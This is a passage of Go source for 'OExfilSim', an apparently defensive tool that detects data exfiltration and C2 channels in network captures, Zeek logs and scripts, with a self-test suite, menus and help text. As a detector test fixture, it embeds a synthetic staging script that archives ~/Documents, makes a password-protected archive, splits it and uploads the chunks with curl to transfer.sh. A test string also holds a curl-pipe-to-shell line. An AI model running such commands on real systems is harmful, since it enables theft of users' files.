		errMsg(err.Error())
		return
	}
	p := simParams{Channel: ch, Size: sz, Chunk: int(chunk), Interval: iv}
	r, err := simulate(p)
	if err != nil {
		errMsg(err.Error())
		return
	}
	clear()
	banner()
	printSim(p, r)
}

func defaultStr(s, d string) string {
	if strings.TrimSpace(s) == "" {
		return d
	}
	return s
}

// ====================================================================
//  DEMO + SELF-TEST
// ====================================================================

func demoAnalysis() analysis {
	td := newTraffic()
	td.ParseCapture("demo.pcap", demoCapture())
	fs, sum := AnalyzeTraffic(td)
	fs = append(fs, scanIndicators("stage.sh", []byte(demoSample()))...)
	sortFindings(fs)
	rep := buildReport("demo", "demo.pcap + stage.sh (synthetic)", fs)
	rep.Traffic = sum.Stats
	return analysis{Report: rep, Summary: &sum, Traffic: true}
}

func demoSample() string {
	return "#!/bin/sh\n# synthetic staging script (lab sample — inert)\n" +
		"tar czf /tmp/.stage/docs.tgz ~/Documents\n" +
		"7z a -pS3cret /tmp/.stage/loot.7z /tmp/.stage/docs.tgz\n" +
		"split -b 2m /tmp/.stage/loot.7z /tmp/.stage/part_\n" +
		"for f in /tmp/.stage/part_*; do curl -s --upload-file \"$f\" https://transfer.sh/; sleep 30; done\n"
}

func runDemo() {
	sectionHeader("Demo — synthetic capture + staging script")
	a := demoAnalysis()
	lastAnalysis = &a
	printAnalysis(a)
}

func runSelfTest() bool {
	pass, fail := 0, 0
	check := func(n string, ok bool, got string) {
		if ok {
			okMsg(n)
			pass++
		} else {
			errMsg(n + "  →  " + got)
			fail++
		}
	}
	ids := func(fs []Finding) map[string]string {
		m := map[string]string{}
		for _, f := range fs {
			if sevRank[f.Severity] > sevRank[m[f.RuleID]] {
				m[f.RuleID] = f.Severity
			}
		}
		return m
	}
	td := newTraffic()
	err := td.ParseCapture("demo.pcap", demoCapture())
	fs, sum := AnalyzeTraffic(td)
	m := ids(fs)
	check("pcap parsed (sessions, DNS, ICMP)", err == nil && sum.Sessions >= 30 && sum.DNSQueries >= 400 && sum.ICMPFlows == 2,
		fmt.Sprint(err, sum.Sessions, sum.DNSQueries, sum.ICMPFlows))
	var sni bool
	for _, s := range td.sessions {
		if s.name == "transfer.sh" {
			sni = true
		}
	}
	check("TLS SNI extracted from ClientHello", sni, "")
	check("DNS exfil detected (base32 labels)", m["EXF-DNS"] == "high", m["EXF-DNS"])
	check("ICMP payload channel detected", m["EXF-ICMP"] != "", fmt.Sprint(m))
	check("stock ping is not flagged", !strings.Contains(fmt.Sprint(fs), "192.0.2.1 (ICMP"), "")
	check("upload to file-drop service (SNI) detected", m["EXF-CLOUD"] != "", fmt.Sprint(m))
	check("periodic chunked uploads detected", m["EXF-CHUNKED"] == "high", m["EXF-CHUNKED"])
	check("bulk SSH egress detected via IP length (snaplen-safe)", m["EXF-ALTPROTO"] == "high", m["EXF-ALTPROTO"])
	browsing := false
	for _, f := range fs {
		if strings.Contains(f.Evidence, "example.com") && f.RuleID != "EXF-DNS" {
			browsing = true
		}
	}
	check("normal download-heavy browsing not flagged", !browsing, "")
	check("C2 beacon (60 s ± 3 s, no SNI) detected", m["EXF-BEACON"] == "high", m["EXF-BEACON"])
	dohSev := map[string]string{}
	for _, f := range fs {
		if f.RuleID == "EXF-DOH" {
			dohSev[strings.Fields(f.Evidence)[0]] = f.Severity
		}
	}
	check("DoH: browser lookups LOW, 6 MB tunnel HIGH", dohSev["10.0.0.5"] == "low" && dohSev["10.0.0.22"] == "high", fmt.Sprint(dohSev))
	st := sum.Stats
	check("top talkers + timeline", st != nil && len(st.Timeline) == timelineBins && len(st.TopSources) > 0 &&
		st.TopSources[0].Host == "10.0.0.15" && st.PeakBytes > 0, fmt.Sprint(st != nil))
	var tl int64
	for _, v := range st.Timeline {
		tl += v
	}
	check("timeline conserves egress bytes", tl == st.EgressBytes, fmt.Sprint(tl, st.EgressBytes))
	// baseline: learn quiet week, then a host uploads somewhere new at 10× its rate
	dir, _ := os.MkdirTemp("", "oexfil-bl-")
	defer os.RemoveAll(dir)
	blp := filepath.Join(dir, "bl.json")
	week := "ts,src,dst,dst_port,bytes_out,bytes_in,sni\n2026-10-01T09:00:00Z,10.3.3.3,198.51.100.10,443,2000000,9000000,intranet-sso.example.com\n" +
		"2026-10-01T13:00:00Z,10.3.3.3,198.51.100.10,443,2000000,9000000,intranet-sso.example.com\n"
	b := newTraffic()
	b.ParseFlowCSV("week.csv", []byte(week))
	_, bs := AnalyzeTraffic(b)
	_, lerr := learnBaseline(blp, profileTraffic(b, bs.chans))
	now := "ts,src,dst,dst_port,bytes_out,bytes_in,sni\n2026-10-08T09:00:00Z,10.3.3.3,198.51.100.10,443,2000000,9000000,intranet-sso.example.com\n" +
		"2026-10-08T09:30:00Z,10.3.3.3,192.0.2.200,443,90000000,50000,files.example.org\n" +
		"2026-10-08T10:00:00Z,10.4.4.4,192.0.2.201,443,30000000,10000,\n"
	c2 := newTraffic()
	c2.ParseFlowCSV("now.csv", []byte(now))
	_, cs := AnalyzeTraffic(c2)
	bl, berr := loadBaseline(blp)
	bm := map[string]string{}
	if berr == nil {
		bm = ids(compareBaseline(bl, profileTraffic(c2, cs.chans), "now.csv"))
	}
	check("baseline: new dest + volume spike + new host", lerr == nil && berr == nil && bm["EXF-BASE-NEWDEST"] == "high" &&
		bm["EXF-BASE-VOLUME"] == "high" && bm["EXF-BASE-NEWHOST"] == "medium", fmt.Sprint(lerr, berr, bm))
	same := ids(compareBaseline(bl, profileTraffic(b, bs.chans), "week.csv"))
	check("baseline: learned traffic is quiet", len(same) == 0, fmt.Sprint(same))
	// Zeek conn + ssl join
	z := newTraffic()
	z.ParseZeek("conn.log", "#separator \\x09\n#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tduration\torig_bytes\tresp_bytes\n"+
		"1730000000.0\tC1\t10.1.1.5\t50000\t203.0.113.9\t443\ttcp\t60\t83886080\t40000\n")
	z.ParseZeek("ssl.log", `{"ts":1730000000.0,"uid":"C1","id.orig_h":"10.1.1.5","server_name":"content.dropboxapi.com"}`+"\n")
	zf, _ := AnalyzeTraffic(z)
	check("Zeek conn.log + ssl.log join → cloud upload", ids(zf)["EXF-CLOUD"] == "high", fmt.Sprint(ids(zf)))
	// flow CSV
	c := newTraffic()
	ok, _ := c.ParseFlowCSV("flows.csv", []byte("src_ip,dst_ip,dst_port,bytes_out,bytes_in\n10.2.2.2,198.51.100.7,8443,73400320,1000\n"))
	cf, _ := AnalyzeTraffic(c)
	check("flow CSV with aliased headers → volume finding", ok && ids(cf)["EXF-VOLUME"] == "high", fmt.Sprint(ok, ids(cf)))
	// indicator scan: chain-y script vs. benign README
	is := ids(scanIndicators("stage.sh", []byte(demoSample())))
	check("script: upload + archive + chunking indicators", is["EXF-IND"] == "high", fmt.Sprint(is))
	benign := "# Build\nRun `make` then `zip -r dist.zip build/`.\nUSB devices are listed by lsusb.\n" +
		"The API uses XMLHttpRequest and fetch().\ncurl https://example.org/install.sh | sh\n"
	worst := ""
	for _, f := range scanIndicators("README.md", []byte(benign)) {
		if sevRank[f.Severity] >= sevRank["medium"] {
			worst += f.RuleID + ":" + f.Title + " "
		}
	}
	check("benign README stays below MEDIUM", worst == "", worst)
	// simulator
	r, err := simulate(simParams{Channel: "dns", Size: 1 << 20, Chunk: 120, Interval: time.Second})
	check("simulator: 1 MB over DNS → EXF-DNS fires", err == nil && len(r.Rules) > 0 && r.Rules[0].Fires && r.Requests == 8739, fmt.Sprint(err, r.Requests))
	r, _ = simulate(simParams{Channel: "https", Size: 2 << 20, Chunk: 1 << 20, Interval: time.Hour})
	check("simulator: 2 MB in 2 HTTPS posts → gap reported", !r.Rules[0].Fires && !r.Rules[1].Fires, fmt.Sprint(r.Rules))
	n, _ := parseSize("1.5MB")
	check("size parser", n == 1572864, strconv.FormatInt(n, 10))
	check("Sigma output uses tactic names", strings.Contains(generateSigma(), "attack.exfiltration"), "")
	fmt.Println()
	if fail == 0 {
		okMsg(fmt.Sprintf("all %d self-tests passed", pass))
	} else {
		errMsg(fmt.Sprintf("%d passed, %d failed", pass, fail))
	}
	return fail == 0
}

// ====================================================================
//  INTERACTIVE TUI
// ====================================================================

var lastAnalysis *analysis

func uiAnalyze() {
	sectionHeader("Analyze Traffic / Logs / Scripts")
	info("pcap · pcapng · Zeek conn/dns/ssl/http (TSV or JSON) · flow CSV · scripts")
	in := prompt("path(s), space separated")
	if in == "" {
		return
	}
	a, err := analyzePaths(strings.Fields(in))
	if err != nil {
		errMsg(err.Error())
		return
	}
	lastAnalysis = &a
	clear()
	banner()
	printAnalysis(a)
}

func uiBaseline() {
	sectionHeader("Host Baseline")
	info("learn: record each host's destinations, egress rate and DNS domains (merges into the file)")
	info("compare: flag never-seen destinations, new hosts, rate spikes, new heavy DNS domains")
	mode := strings.ToLower(prompt("[l]earn or [c]ompare"))
	file := prompt("baseline file (blank = oexfil-baseline.json)")
	if file == "" {
		file = "oexfil-baseline.json"
	}
	in := prompt("capture / Zeek / flow CSV path(s), space separated")
	if in == "" {
		return
	}
	learnPath, baselinePath = "", ""
	switch {
	case strings.HasPrefix(mode, "l"):
		learnPath = file
	case strings.HasPrefix(mode, "c"):
		baselinePath = file
	default:
		errMsg("choose l or c")
		return
	}
	a, err := analyzePaths(strings.Fields(in))
	learnPath, baselinePath = "", ""
	if err != nil {
		errMsg(err.Error())
		return
	}
	lastAnalysis = &a
	if mode[0] == 'l' {
		for _, n := range a.Notes {
			okMsg(n)
		}
		return
	}
	clear()
	banner()
	printAnalysis(a)
}

func interactiveExport() {
	sectionHeader("Export")
	var rep Report
	if lastAnalysis != nil {
		rep = lastAnalysis.Report
		info("exporting the last analysis (" + rep.Target + ")")
	} else {
		rep = buildReport("catalog-dump", "catalog", catalogAsFindings())
		info("no analysis yet — exporting the technique catalog")
	}
	f := prompt("format txt|md|json|csv|sarif")
	if f == "" {
		f = "txt"
	}
	out := prompt("output file (blank=stdout)")
	if err := writeOut(renderReport(rep, f), out); err != nil {
		errMsg(err.Error())
	} else if out != "" {
		okMsg("wrote " + out)
	}
}

var tuiActions = []struct {
	name, desc string
	run        func()
}{
	{"Analyze traffic / logs", "pcap · Zeek · flow CSV · scripts", func() { uiAnalyze(); pause() }},
	{"Host baseline", "learn normal egress · flag deviations", func() { uiBaseline(); pause() }},
	{"Channel simulator", "which detections would a test trip?", func() { uiSimulate(); pause() }},
	{"Run demo", "synthetic capture, 7 exfil / C2 channels", func() { runDemo(); pause() }},
	{"Catalog browser", "techniques, markers, detection", interactiveBrowse},
	{"Catalog statistics", "severity / category breakdown", func() { interactiveStats(); pause() }},
	{"ATT&CK coverage matrix", "tactic / technique coverage", func() { attackCoverage(); pause() }},
	{"MITRE technique index", "pivot the catalog by technique", menuShowMitre},
	{"Detection rules (Sigma)", "generate Sigma from markers", menuSigma},
	{"Export", "last analysis or catalog", func() { interactiveExport(); pause() }},
	{"Self-test", "parser + detector regression suite", func() { runSelfTest(); pause() }},
}

func mainMenu() {
	for {
		items := make([]menuItem, len(tuiActions))
		for i, a := range tuiActions {
			items[i] = menuItem{key: strconv.Itoa(i + 1), name: a.name, desc: a.desc, clr: CY + B}
		}
		sel := strings.TrimLeft(strings.TrimSpace(menu("Main Menu", items)), "0")
		if sel == "" || strings.EqualFold(sel, "q") {
			clear()
			okMsg("Goodbye. Offline analysis only — nothing was sent.")
			return
		}
		if strings.EqualFold(sel, "h") || strings.EqualFold(sel, "help") || sel == "?" {
			tuiHelp()
			continue
		}
		n, err := strconv.Atoi(sel)
		if err != nil || n < 1 || n > len(tuiActions) {
			warnMsg("unknown selection")
			pause()
			continue
		}
		clear()
		banner()
		tuiActions[n-1].run()
	}
}

// ====================================================================
//  CLI
// ====================================================================

func usage() {
	banner()
	fmt.Print(`USAGE:
  OExfilSim [flags] [INPUT ...]

  INPUT is auto-detected: pcap / pcapng, Zeek conn/dns/ssl/http logs (TSV or
  JSON; pass several and they are joined by uid), a flow CSV (src,dst,
  dst_port,bytes_out,bytes_in,… aliases accepted) or any script / command
  log (indicator scan). With no input the interactive TUI starts.

DETECTION:
  --vol-med MB       Per-destination egress for MEDIUM (default 10)
  --vol-high MB      Per-destination egress for HIGH   (default 50)
  --min-sev SEV      Hide findings below SEV (info|low|medium|high|critical)
  --top N            Rows in the top-talker tables (default 10)
  Rules include EXF-BEACON (steady low-volume check-ins) and EXF-DOH
  (DNS-over-HTTPS / TLS / QUIC that bypasses the internal resolver).

HOST BASELINE:
  --learn FILE       Record each host's normal egress (destinations, rate,
                     DNS domains) into FILE; repeat runs merge more captures
  --baseline FILE    Flag deviations: never-seen destinations, unprofiled
                     hosts, egress-rate spikes, heavy new DNS domains

SIMULATOR (offline model — no traffic is generated):
  --sim CHANNEL      dns | icmp | https | cloud | ssh
  --size SIZE        Data to move, e.g. 25MB   (default 5MB)
  --chunk BYTES      Bytes per request         (default per channel)
  --interval DUR     Gap between requests      (default 1s)

CATALOG:
  --list | --search Q | --category C | --platform P | --id ID
  --sigma            Sigma rules from catalog markers
  --coverage         ATT&CK coverage matrix
  --stats            Catalog statistics
  --plan             Catalog-ranked detection plan

OUTPUT:
  --format FMT       txt | md | json | csv | sarif
  --output FILE      Write the report to FILE
  --demo             Analyse a synthetic capture + staging script
  --selftest         Run the regression suite
  --howto            Usage, legal notes and navigation
  --no-color         Disable colours
  --version          Print version

EXIT CODES:
  0 nothing HIGH or above · 1 error · 3 HIGH/CRITICAL exfil indicators

EXAMPLES:
  OExfilSim capture.pcapng
  OExfilSim conn.log dns.log ssl.log --format sarif --output exfil.sarif
  OExfilSim flows.csv --vol-med 5 --vol-high 25
  OExfilSim --sim dns --size 50MB --chunk 120 --interval 500ms
  OExfilSim --learn net.baseline.json mon.pcapng tue.pcapng     # quiet week
  OExfilSim --baseline net.baseline.json today.pcapng
`)
}

// parseInterleaved lets flags appear before or after positional inputs.
func parseInterleaved(fs *flag.FlagSet, args []string) ([]string, error) {
	var pos []string
	for {
		if err := fs.Parse(args); err != nil {
			return nil, err
		}
		args = fs.Args()
		if len(args) == 0 {
			return pos, nil
		}
		pos = append(pos, args[0])
		args = args[1:]
	}
}

func main() {
	fs := flag.NewFlagSet(APPNAME, flag.ContinueOnError)
	fs.Usage = usage
	var (
		fVersion  = fs.Bool("version", false, "")
		fHowto    = fs.Bool("howto", false, "")
		fDemo     = fs.Bool("demo", false, "")
		fSelf     = fs.Bool("selftest", false, "")
		fList     = fs.Bool("list", false, "")
		fStats    = fs.Bool("stats", false, "")
		fPlan     = fs.Bool("plan", false, "")
		fSigma    = fs.Bool("sigma", false, "")
		fCover    = fs.Bool("coverage", false, "")
		fSearch   = fs.String("search", "", "")
		fCat      = fs.String("category", "", "")
		fPlat     = fs.String("platform", "", "")
		fID       = fs.String("id", "", "")
		fScan     = fs.String("scan", "", "")
		fInput    = fs.String("input", "", "")
		fFormat   = fs.String("format", "", "")
		fOutput   = fs.String("output", "", "")
		fMinSev   = fs.String("min-sev", "info", "")
		fVolMed   = fs.Float64("vol-med", 10, "")
		fVolHigh  = fs.Float64("vol-high", 50, "")
		fSim      = fs.String("sim", "", "")
		fSize     = fs.String("size", "5MB", "")
		fChunk    = fs.String("chunk", "", "")
		fInterval = fs.Duration("interval", time.Second, "")
		fNoColor  = fs.Bool("no-color", false, "")
		fTop      = fs.Int("top", topN, "")
		fLearn    = fs.String("learn", "", "")
		fBase     = fs.String("baseline", "", "")
	)
	inputs, err := parseInterleaved(fs, os.Args[1:])
	if err != nil {
		if errors.Is(err, flag.ErrHelp) {
			return
		}
		os.Exit(1)
	}
	if *fNoColor {
		noColor = true
	}
	volMed, volHigh = int64(*fVolMed*(1<<20)), int64(*fVolHigh*(1<<20))
	topN, learnPath, baselinePath = *fTop, *fLearn, *fBase
	if volMed <= 0 || volHigh < volMed {
		errMsg("need 0 < --vol-med ≤ --vol-high")
		os.Exit(1)
	}
	if _, ok := sevRank[strings.ToLower(*fMinSev)]; !ok {
		errMsg("unknown --min-sev " + *fMinSev)
		os.Exit(1)
	}
	format := *fFormat
	if format == "" {
		format = "txt"
	}
	for _, p := range []string{*fScan, *fInput} {
		if p != "" {
			inputs = append(inputs, p)
		}
	}

	switch {
	case *fVersion:
		fmt.Printf("%s v%s — %s\n", APPNAME, VERSION, TAGLINE)
		return
	case *fSelf:
		if !runSelfTest() {
			os.Exit(1)
		}
		return
	case *fHowto:
		if noColor {
			fmt.Print(howtoText())
		} else {
			showHowto()
		}
		return
	case *fSim != "":
		sz, err := parseSize(*fSize)
		if err != nil {
			errMsg(err.Error())
			os.Exit(1)
		}
		ch := strings.ToLower(*fSim)
		chunkS := *fChunk
		if chunkS == "" {
			chunkS = map[string]string{"dns": "120", "icmp": "512", "https": "1048576", "cloud": "4194304", "ssh": "33554432"}[ch]
		}
		chunk, err := parseSize(defaultStr(chunkS, "1"))
		if err != nil {
			errMsg(err.Error())
			os.Exit(1)
		}
		p := simParams{Channel: ch, Size: sz, Chunk: int(chunk), Interval: *fInterval}
		r, err := simulate(p)
		if err != nil {
			errMsg(err.Error())
			os.Exit(1)
		}
		if *fFormat == "json" {
			b, _ := json.MarshalIndent(map[string]any{"params": p, "requests": r.Requests, "wire_bytes": r.Wire,
				"duration": r.Duration.String(), "rules": r.Rules}, "", "  ")
			writeOut(string(b), *fOutput)
			return
		}
		printSim(p, r)
		return
	case *fList:
		writeOut(renderReport(buildReport("catalog", "catalog", catalogAsFindings()), format), *fOutput)
		return
	case *fStats:
		printCatalogStatsText()
		return
	case *fSearch != "":
		writeOut(renderReport(buildReport("search:"+*fSearch, "catalog", entriesToFindings(searchCatalog(*fSearch))), format), *fOutput)
		return
	case *fCat != "":
		writeOut(renderReport(buildReport("category:"+*fCat, "catalog", entriesToFindings(filterByCategory(*fCat))), format), *fOutput)
		return
	case *fPlat != "":
		writeOut(renderReport(buildReport("platform:"+*fPlat, "catalog", entriesToFindings(filterByPlatform(*fPlat))), format), *fOutput)
		return
	case *fID != "":
		e, ok := catalogByID(*fID)
		if !ok {
			errMsg("no entry with ID " + *fID)
			os.Exit(1)
		}
		writeOut(renderReport(buildReport("entry:"+*fID, "catalog", entriesToFindings([]CatalogEntry{e})), format), *fOutput)
		return
	case *fSigma:
		writeOut(generateSigma(), *fOutput)
		return
	case *fCover:
		writeOut(attackCoverageText(), *fOutput)
		return
	case *fPlan:
		writeOut(renderReport(planReport(), format), *fOutput)
		return
	}

	var a analysis
	switch {
	case *fDemo:
		a = demoAnalysis()
	case len(inputs) > 0:
		a, err = analyzePaths(inputs)
		if err != nil {
			errMsg(err.Error())
			os.Exit(1)
		}
	default:
		mainMenu()
		return
	}
	stats := a.Report.Traffic
	a.Report = buildReport(a.Report.Mode, a.Report.Target, filterMinSev(a.Report.Findings, *fMinSev))
	a.Report.Traffic = stats
	if *fFormat == "" && *fOutput == "" {
		banner()
		printAnalysis(a)
	} else if err := writeOut(renderReport(a.Report, format), *fOutput); err != nil {
		errMsg(err.Error())
		os.Exit(1)
	} else {
		for _, n := range a.Notes {
			fmt.Fprintln(os.Stderr, "# "+n)
		}
	}
	for _, f := range a.Report.Findings {
		if sevRank[strings.ToLower(f.Severity)] >= sevRank["high"] {
			os.Exit(3)
		}
	}
}

// ---------------------------------------------------------------------------
// Help & Usage  (interactive menu [H])
// Page 1: in-app guide (what the tool does, every menu option, tips).
// Page 2: the full command-line reference (same text as --help).
// ---------------------------------------------------------------------------

type owlHelpItem struct{ key, text string }

func owlHelpWrap(s string, width int) []string {
	var out []string
	for _, para := range strings.Split(s, "\n") {
		words := strings.Fields(para)
		if len(words) == 0 {
			out = append(out, "")
			continue
		}
		cur := ""
		for _, w := range words {
			if cur != "" && len([]rune(cur))+1+len([]rune(w)) > width {
				out = append(out, cur)
				cur = w
			} else if cur == "" {
				cur = w
			} else {
				cur += " " + w
			}
		}
		out = append(out, cur)
	}
	return out
}

func owlHelpTitle(t string) {
	fmt.Println()
	fmt.Println("  " + col("▸ "+t, B+CY))
}

func owlHelpPara(lines []string) {
	for _, l := range lines {
		for _, w := range owlHelpWrap(l, 60) {
			fmt.Println("    " + col(w, W))
		}
	}
}

func owlHelpRows(items []owlHelpItem) {
	kw := 0
	for _, it := range items {
		if n := len([]rune(it.key)); n > kw {
			kw = n
		}
	}
	for _, it := range items {
		k := "[" + it.key + "]" + strings.Repeat(" ", kw-len([]rune(it.key)))
		for i, w := range owlHelpWrap(it.text, 56-kw) {
			if i == 0 {
				fmt.Println("    " + col(k, YLW+B) + "  " + col(w, W))
			} else {
				fmt.Println("    " + strings.Repeat(" ", kw+2) + "  " + col(w, W))
			}
		}
	}
}

func owlHelpRule() { fmt.Println(col(strings.Repeat("─", 66), CY)) }

func tuiHelp() {
	clear()
	banner()
	owlHelpRule()
	fmt.Println("  " + col("⬡  Help & Usage — "+APPNAME, B+CY))
	owlHelpRule()
	owlHelpTitle("WHAT IT DOES")
	owlHelpPara(owlHelpAbout)
	owlHelpTitle("HOW TO USE THE MENU")
	owlHelpPara(owlHelpFlow)
	owlHelpTitle("MENU OPTIONS")
	owlHelpRows(owlHelpMenu)
	owlHelpTitle("TIPS")
	owlHelpRows(owlHelpTips)
	fmt.Println()
	owlHelpRule()
	fmt.Println("  " + col("Next page: command-line flags & copy-paste examples", DIM))
	pause()
	clear()
	owlHelpCLI()
	fmt.Println()
	fmt.Println("  " + col("Tip: the same reference is printed by  "+APPNAME+" --help", DIM))
	pause()
}

var owlHelpAbout = []string{
	"OExfilSim detects data exfiltration and C2 traffic in network evidence. It reads pcap / pcapng captures, Zeek logs (conn, dns, ssl, http), flow CSV exports and shell or PowerShell scripts. The format is detected automatically.",
	"It flags DNS tunnelling, ICMP payload exfil, uploads to cloud storage, DNS-over-HTTPS, odd protocols on odd ports, chunked uploads, regular C2 beacons and large outbound volume per host. Script and log text is checked for staging, compression, encryption and password-protected archives. Related findings are linked into a kill chain with a grade and MITRE ATT&CK mapping.",
	"It also has a channel simulator. It models an authorised exfil test (no traffic is sent) and shows which detections the test would trigger.",
}

var owlHelpFlow = []string{
	"Type the number of an option and press Enter. Start with [1] and give it one or more files, or try [4] to see a full example. [10] exports the last analysis. [H] opens this help, [0], q or a blank line quits.",
}

var owlHelpMenu = []owlHelpItem{
	{"1", "Analyze traffic / logs: enter one or more paths separated by spaces, e.g. conn.log dns.log ssl.log, or capture.pcapng. Shows findings, the kill chain, top talkers and a grade."},
	{"2", "Host baseline: choose l (learn) or c (compare), a baseline file (blank = oexfil-baseline.json) and capture / Zeek / flow paths. Learn on a quiet, normal period; compare later to flag new destinations, new hosts, rate spikes and new heavy DNS domains."},
	{"3", "Channel simulator: choose a channel (dns, icmp, https, cloud, ssh), the data size (e.g. 5MB), bytes per request and the interval between requests (e.g. 1s, 30s). Shows how long the transfer takes and which detections it would trigger."},
	{"4", "Run demo: a synthetic capture containing seven exfil / C2 channels."},
	{"5", "Catalog browser: list, search or filter the 45 exfil techniques, or open one by ID to see markers, detection advice and MITRE IDs."},
	{"6", "Catalog statistics: entries by severity and category."},
	{"7", "ATT&CK coverage matrix: which tactics and techniques the catalog covers."},
	{"8", "MITRE technique index: the catalog grouped by technique ID."},
	{"9", "Detection rules (Sigma): generates Sigma-style rules from the catalog. Enter a path to save them (blank = only show)."},
	{"10", "Export: the last analysis, or the catalog if nothing was analysed yet. Choose txt, md, json, csv or sarif and an output file (blank = print to screen)."},
	{"11", "Self-test: parser and detector regression suite."},
}

var owlHelpTips = []owlHelpItem{
	{"*", "Zeek logs give the best results. Pass conn.log, dns.log and ssl.log together so findings can be correlated."},
	{"*", "Volume thresholds can be tuned with --vol-med and --vol-high (MB sent to one destination), see the next page."},
	{"*", "Use the simulator before a purple-team exercise to choose a speed that should (or should not) be detected."},
	{"*", "The legal notes and detection details are on page 3."},
}

func owlHelpCLI() {
	usage()
	pause()
	showHowto()
}
